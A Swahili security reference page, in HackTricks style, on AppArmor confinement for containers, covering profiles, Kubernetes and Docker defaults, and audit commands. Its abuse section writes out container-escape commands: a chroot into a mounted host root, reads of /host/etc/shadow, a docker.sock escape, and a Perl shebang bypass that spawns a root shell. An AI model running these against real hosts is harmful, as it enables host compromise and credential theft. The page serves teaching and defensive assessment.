# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

AppArmor ni mfumo wa **Mandatory Access Control** unaotumia vizuizi kupitia profiles za kila program. Tofauti na ukaguzi wa kawaida wa DAC, ambao hutegemea sana ownership ya user na group, AppArmor huwezesha kernel kutekeleza policy iliyounganishwa moja kwa moja na process. Katika mazingira ya container, hili ni muhimu kwa sababu workload inaweza kuwa na privilege ya kawaida ya kutosha kujaribu kitendo fulani, lakini bado ikazuiwa kwa sababu AppArmor profile yake hairuhusu path, mount, tabia ya network, au matumizi ya capability husika.

Jambo muhimu zaidi la kimawazo ni kwamba AppArmor ni **path-based**. Huchanganua ufikiaji wa filesystem kupitia path rules badala ya labels kama SELinux. Hilo huifanya iwe rahisi kueleweka na yenye nguvu, lakini pia linamaanisha kuwa bind mounts na miundo mbadala ya path zinahitaji uangalifu mkubwa. Ikiwa content ileile ya host inaweza kufikiwa kupitia path tofauti, athari ya policy inaweza isiwe ile ambayo operator alitarajia mwanzoni.

## Jukumu Katika Kutenga Container

Ukaguzi wa usalama wa container mara nyingi huishia kwenye capabilities na seccomp, lakini AppArmor bado ina umuhimu baada ya ukaguzi huo. Fikiria container yenye privilege zaidi ya inavyopaswa kuwa, au workload iliyohitaji capability moja ya ziada kwa sababu za uendeshaji. AppArmor bado inaweza kuzuia file access, mount behavior, networking, na execution patterns kwa njia zinazozuia abuse path iliyo wazi. Ndiyo maana kuzima AppArmor "ili tu application ifanye kazi" kunaweza kubadilisha kimyakimya configuration iliyo hatarishi tu kuwa configuration inayoweza kutumiwa vibaya moja kwa moja.

## Maabara

Ili kuangalia ikiwa AppArmor iko active kwenye host, tumia:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Ili kuona mchakato wa sasa wa container unaendeshwa chini ya:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Tofauti hiyo ni ya kufundisha. Katika hali ya kawaida, mchakato unapaswa kuonyesha muktadha wa AppArmor unaohusishwa na profile iliyochaguliwa na runtime. Katika hali ya unconfined, safu hiyo ya ziada ya vizuizi huondolewa.

Unaweza pia kukagua kile ambacho Docker inaamini kuwa ilitumia:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Matumizi ya Wakati wa Kuendesha

Docker inaweza kutumia AppArmor profile ya msingi au custom pale host inapoiunga mkono. Podman pia inaweza kuunganishwa na AppArmor kwenye mifumo inayotumia AppArmor, ingawa kwenye distributions zinazotanguliza SELinux, mfumo mwingine wa MAC mara nyingi huwa ndio unaotumika zaidi. Kubernetes inaweza kuweka sera ya AppArmor katika kiwango cha workload kwenye nodes zinazoiunga mkono AppArmor. LXC na mazingira yanayohusiana ya system-container ya familia ya Ubuntu pia hutumia AppArmor kwa kiwango kikubwa.

Jambo la msingi ni kwamba AppArmor si "Docker feature". Ni host-kernel feature ambayo runtimes kadhaa zinaweza kuchagua kutumia. Ikiwa host haiiungi mkono au runtime imeagizwa iendeshe bila ulinzi (`unconfined`), ulinzi unaodhaniwa haupo kwa kweli.

Kwa Kubernetes hasa, API ya kisasa ni `securityContext.appArmorProfile`. Tangu Kubernetes `v1.30`, AppArmor annotations za zamani za beta zimewekewa alama ya deprecated. Kwenye hosts zinazotumika, `RuntimeDefault` ndiyo profile ya msingi, huku `Localhost` ikirejelea profile ambayo lazima iwe tayari imepakiwa kwenye node. Hili ni muhimu wakati wa ukaguzi kwa sababu manifest inaweza kuonekana kuwa inafahamu AppArmor, lakini bado ikategemea kabisa support ya node na profiles zilizopakiwa awali.<sup>[[1]](#references)</sup>

Jambo moja dogo lakini muhimu kiutendaji ni kwamba kuweka wazi `appArmorProfile.type: RuntimeDefault` ni kali zaidi kuliko kuacha field hiyo bila kuwekwa. Ikiwa field imewekwa wazi na node haiungi mkono AppArmor, admission inapaswa kushindwa. Ikiwa field imeachwa bila kuwekwa, workload bado inaweza kuendeshwa kwenye node isiyokuwa na AppArmor na isiweze tu kupata layer hiyo ya ziada ya confinement. Kwa mtazamo wa attacker, hii ni sababu nzuri ya kukagua manifest pamoja na hali halisi ya node.<sup>[[1]](#references)</sup>

Kwenye hosts za AppArmor zinazoweza kuendesha Docker, default inayojulikana zaidi ni `docker-default`. Profile hiyo hutengenezwa kutoka kwenye AppArmor template ya Moby na ni muhimu kwa sababu inaeleza kwa nini baadhi ya capability-based PoCs bado hushindwa kwenye container ya kawaida. Kwa ujumla, `docker-default` inaruhusu networking ya kawaida, inazuia writes kwenye sehemu kubwa ya `/proc`, inazuia access kwenye sehemu nyeti za `/sys`, inazuia mount operations, na inawekea ptrace mipaka ili isiwe primitive ya jumla ya kuchunguza host. Kuelewa baseline hiyo husaidia kutofautisha kati ya "container ina `CAP_SYS_ADMIN`" na "container inaweza kweli kutumia capability hiyo dhidi ya kernel interfaces ninazozihitaji".

## Usimamizi wa Profile

AppArmor profiles kwa kawaida huhifadhiwa chini ya `/etc/apparmor.d/`. Kanuni ya kawaida ya kutaja majina ni kubadilisha slashes kwenye executable path kuwa dots. Kwa mfano, profile ya `/usr/bin/man` kwa kawaida huhifadhiwa kama `/etc/apparmor.d/usr.bin.man`. Maelezo haya ni muhimu wakati wa defense na assessment kwa sababu ukishajua jina la active profile, mara nyingi unaweza kupata faili inayolingana haraka kwenye host.

Useful host-side management commands include:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Sababu ya amri hizi kuwa muhimu katika reference ya container-security ni kwamba zinaeleza jinsi profiles zinavyoundwa, kupakiwa, kuhamishiwa kwenye complain mode, na kurekebishwa baada ya mabadiliko ya application. Ikiwa operator ana mazoea ya kuhamisha profiles kwenye complain mode wakati wa troubleshooting na kusahau kurejesha enforcement, container inaweza kuonekana kuwa imelindwa kwenye documentation huku ikifanya kazi kwa ulegevu zaidi katika uhalisia.

### Kujenga Na Kusasisha Profiles

`aa-genprof` inaweza kufuatilia tabia ya application na kusaidia kutengeneza profile kwa njia ya interactive:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` inaweza kutengeneza template profile ambayo baadaye inaweza kupakiwa kwa `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wakati binary inabadilika na policy inahitaji kusasishwa, `aa-logprof` inaweza kurudia denial zilizopatikana kwenye logs na kumsaidia operator kuamua kuziruhusu au kuzikataa:
```bash
sudo aa-logprof
```
### Logs

Kukataliwa kwa AppArmor mara nyingi huonekana kupitia `auditd`, syslog, au tools kama vile `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Hii ni muhimu kwa matumizi ya kiutendaji na ya ki-offensive. Defenders huitumia kuboresha profiles. Attackers huitumia kujifunza ni path au operation gani hasa inayozuiwa na kama AppArmor ndiyo control inayozuia exploit chain.

### Kutambua Faili Halisi la Profile

Wakati runtime inaonyesha jina mahususi la AppArmor profile kwa container, mara nyingi ni muhimu kuhusianisha jina hilo na profile file iliyo kwenye disk:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Hii ni muhimu hasa wakati wa ukaguzi wa upande wa host kwa sababu inaunganisha pengo kati ya "container inasema inaendeshwa chini ya profile `lowpriv`" na "rules halisi ziko kwenye file hii mahususi ambayo inaweza kukaguliwa au kupakiwa upya".

### Rules Zenye Signal Kubwa za Kukagua

Unapoweza kusoma profile, usiishie kwenye mistari rahisi ya `deny`. Aina kadhaa za rules hubadilisha kwa kiasi kikubwa jinsi AppArmor itakavyokuwa na manufaa dhidi ya jaribio la container escape:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: huendesha target binary bila confinement. Ikiwa helper, shell, au interpreter inayoweza kufikiwa inaruhusiwa chini ya `ux`, kwa kawaida hilo ndilo jambo la kwanza la kutest.
- `px` / `Px` na `cx` / `Cx`: hufanya profile transitions wakati wa exec. Hizi si mbaya moja kwa moja, lakini zinafaa kukaguliwa kwa sababu transition inaweza kufikisha kwenye profile pana zaidi kuliko ya sasa.
- `change_profile`: huruhusu task kubadilisha na kuingia kwenye profile nyingine iliyopakiwa, mara moja au wakati wa exec inayofuata. Ikiwa destination profile ni dhaifu zaidi, hii inaweza kuwa escape hatch iliyokusudiwa kutoka kwenye domain yenye restrictions.
- `flags=(complain)`, `flags=(unconfined)`, au `flags=(prompt)` mpya zaidi: hizi zinapaswa kubadilisha kiwango cha trust unachoweka kwenye profile. `complain` hu-log denials badala ya kuzitekeleza, `unconfined` huondoa boundary, na `prompt` hutegemea userspace decision path badala ya deny inayotekelezwa moja kwa moja na kernel.
- `userns` au `userns create,`: AppArmor policy mpya zaidi inaweza kudhibiti uundaji wa user namespaces. Ikiwa container profile inairuhusu waziwazi, nested user namespaces bado zinaendelea kuwepo hata wakati platform inatumia AppArmor kama sehemu ya hardening strategy.

Grep muhimu upande wa host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Aina hii ya ukaguzi mara nyingi huwa na manufaa zaidi kuliko kuchunguza mamia ya sheria za kawaida za faili. Ikiwa breakout inategemea kutekeleza helper, kuingia kwenye namespace mpya, au kutoroka kwenda kwenye profile yenye vizuizi vichache, jibu mara nyingi limefichwa katika sheria hizi zinazoelekeza mabadiliko badala ya mistari iliyo wazi ya mtindo wa `deny /etc/shadow r`.

## Misconfigurations

Kosa lililo wazi zaidi ni `apparmor=unconfined`. Mara nyingi administrators huiweka wakati wa kufanya debugging ya application iliyoshindwa kwa sababu profile ilizuia kwa usahihi kitu hatari au kisichotarajiwa. Ikiwa flag hiyo itabaki production, safu nzima ya MAC itakuwa imeondolewa kwa ufanisi.

Tatizo jingine lisilo dhahiri ni kudhani kwamba bind mounts hazina madhara kwa sababu file permissions zinaonekana kuwa za kawaida. Kwa kuwa AppArmor inategemea paths, kuonyesha host paths chini ya alternate mount locations kunaweza kuingiliana vibaya na path rules. Kosa la tatu ni kusahau kwamba jina la profile katika config file lina maana ndogo sana ikiwa host kernel hailazimishi AppArmor kwa kweli.

## Abuse

AppArmor ikiwa haipo, operations zilizokuwa zimewekewa vizuizi zinaweza kufanya kazi ghafla: kusoma sensitive paths kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zilipaswa kubaki ngumu zaidi kutumia, kutekeleza mount-related actions ikiwa capabilities/seccomp pia zinaruhusu, au kutumia paths ambazo profile kwa kawaida ingekataa. AppArmor mara nyingi ndiyo mechanism inayoeleza kwa nini jaribio la capability-based breakout "should work" kinadharia lakini bado linashindwa kwa vitendo. Ondoa AppArmor, na jaribio hilo hilo linaweza kuanza kufanikiwa.

Ikiwa unashuku kwamba AppArmor ndiyo kitu kikuu kinachozuia path-traversal, bind-mount, au mount-based abuse chain, hatua ya kwanza kwa kawaida ni kulinganisha kile kinachoweza kufikiwa ukiwa na profile na bila profile. Kwa mfano, ikiwa host path imewekwa ndani ya container, anza kwa kuangalia ikiwa unaweza kuipitia na kuisoma:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya majaribio ya vitendo zaidi ni kubaini ikiwa AppArmor ndiyo control inayozuia mount operations au ufikiaji wa kernel filesystems nyeti:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Katika mazingira ambapo path ya host tayari inapatikana kupitia bind mount, kupoteza AppArmor kunaweza pia kubadilisha tatizo la information disclosure la read-only kuwa ufikiaji wa moja kwa moja wa mafaili ya host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Lengo la commands hizi si kwamba AppArmor peke yake huunda breakout. Ni kwamba baada ya AppArmor kuondolewa, abuse paths nyingi za filesystem na mount zinaweza kujaribiwa mara moja.

### Mfano Kamili: AppArmor Imezimwa + Host Root Imemountiwa

Ikiwa container tayari ina host root iliyobind-mountiwa kwenye `/host`, kuondoa AppArmor kunaweza kubadilisha abuse path ya filesystem iliyozuiwa kuwa host escape kamili:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Mara tu shell inapotekelezwa kupitia filesystem ya host, workload huwa imevuka kwa ufanisi mpaka wa container:
```bash
id
hostname
cat /etc/shadow | head
```
### Mfano Kamili: AppArmor Imezimwa + Runtime Socket

Ikiwa kizuizi halisi kilikuwa AppArmor inayolinda hali ya runtime, socket iliyomountiwa inaweza kutosha kufanikisha escape kamili:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Njia kamili inategemea mount point, lakini matokeo ya mwisho ni yale yale: AppArmor haiwezi tena kuzuia access kwa runtime API, na runtime API inaweza kuzindua container inayoweza ku-compromise host.

### Mfano Kamili: Path-Based Bind-Mount Bypass

Kwa sababu AppArmor inategemea path, kulinda `/proc/**` hakulindi kiotomatiki maudhui yale yale ya host procfs yanapofikiwa kupitia path tofauti:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Athari inategemea ni nini hasa kime-mountiwa na ikiwa njia mbadala pia inapita controls nyingine, lakini pattern hii ni mojawapo ya sababu zilizo wazi zaidi zinazoonyesha kwamba AppArmor lazima ichunguzwe pamoja na mpangilio wa mount badala ya kuchunguzwa peke yake.

### Mfano Kamili: Shebang Bypass

Sera ya AppArmor wakati mwingine hulenga interpreter path kwa namna ambayo haizingatii kikamilifu script execution kupitia ushughulikiaji wa shebang. Mfano wa kihistoria ulihusisha kutumia script ambayo mstari wake wa kwanza unaelekeza kwenye interpreter iliyowekewa confinement:<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Aina hii ya mfano ni muhimu kama ukumbusho kwamba nia ya profile na semantics halisi za utekelezaji zinaweza kutofautiana. Wakati wa kukagua AppArmor katika mazingira ya container, minyororo ya interpreters na njia mbadala za utekelezaji zinahitaji uangalifu maalum.

## Ukaguzi

Lengo la ukaguzi huu ni kujibu haraka maswali matatu: je, AppArmor imewezeshwa kwenye host, je, process ya sasa imewekewa vizuizi, na je, runtime ilitumia profile kwenye container hii?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Kinachovutia hapa:

- Ikiwa `/proc/self/attr/current` inaonyesha `unconfined`, workload haifaidi confinement ya AppArmor.
- Ikiwa `aa-status` inaonyesha AppArmor imezimwa au haijapakiwa, jina lolote la profile katika runtime config kwa kiasi kikubwa ni la mapambo tu.
- Ikiwa `docker inspect` inaonyesha `unconfined` au custom profile isiyotarajiwa, mara nyingi hiyo ndiyo sababu filesystem au mount-based abuse path inafanya kazi.
- Ikiwa `/sys/kernel/security/apparmor/profiles` haina profile uliyotarajia, runtime au orchestrator configuration pekee haitoshi.
- Ikiwa profile inayodaiwa kuwa hardened ina rules za mtindo wa `ux`, `change_profile` pana, `userns`, au `flags=(complain)`, boundary ya kiutendaji inaweza kuwa dhaifu zaidi kuliko jina la profile linavyopendekeza.

Ikiwa container tayari ina privileges zilizoinuliwa kwa sababu za kiutendaji, kuacha AppArmor ikiwa imewezeshwa mara nyingi hutofautisha kati ya exception inayodhibitiwa na security failure pana zaidi.

## Runtime Defaults

| Runtime / platform | Hali ya kawaida | Tabia ya kawaida | Udhaifu wa kawaida wa mwongozo |
| --- | --- | --- | --- |
| Docker Engine | Huwezeshwa kwa kawaida kwenye hosts zinazoweza kutumia AppArmor | Hutumia AppArmor profile ya `docker-default` isipokuwa ibadilishwe | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Hutegemea host | AppArmor inaungwa mkono kupitia `--security-opt`, lakini default halisi hutegemea host/runtime na si ya jumla kama profile ya `docker-default` iliyoandikwa kwa Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Default ya masharti | Ikiwa `appArmorProfile.type` haijabainishwa, default ni `RuntimeDefault`, lakini hutumika tu AppArmor ikiwa imewezeshwa kwenye node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` yenye profile dhaifu, nodes zisizo na msaada wa AppArmor |
| containerd / CRI-O under Kubernetes | Hufuata msaada wa node/runtime | Runtimes zinazotumiwa na Kubernetes kwa kawaida huunga mkono AppArmor, lakini enforcement halisi bado hutegemea msaada wa node na mipangilio ya workload | Sawa na safu ya Kubernetes; runtime configuration ya moja kwa moja pia inaweza kuruka AppArmor kabisa |

Kwa AppArmor, variable muhimu zaidi mara nyingi ni **host**, si runtime pekee. Mpangilio wa profile katika manifest hauundi confinement kwenye node ambayo AppArmor haijawezeshwa.

## Marejeo

- [1] [Kubernetes security context: sehemu za AppArmor profile na tabia ya msaada wa node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, na profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - AppArmor shebang bypass yenye Perl script](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
